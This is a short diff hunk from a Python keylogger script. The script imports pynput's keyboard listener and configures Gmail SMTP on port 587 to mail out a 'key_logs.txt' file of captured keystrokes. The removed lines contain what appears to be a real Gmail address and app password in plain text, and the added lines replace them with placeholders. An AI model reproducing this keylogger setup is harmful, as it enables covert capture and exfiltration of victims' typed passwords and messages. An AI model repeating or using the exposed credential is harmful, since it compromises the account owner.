@@ -4,9 +4,9 @@ import ssl
 from pynput import keyboard
 
 # Replace these values with your email credentials
-sender_email = "deepak8608132747@gmail.com"
-receiver_email = "deepak8608132747@gmail.com"
-password = "uenh hkzr oyxd csnm"  # Replace with your email password
+sender_email = "your-email@gmail.com"
+receiver_email = "your-email@gmail.com"
+password = "password of your gmail"  # Replace with your email password
 port = 587
 log_file = "key_logs.txt"
 
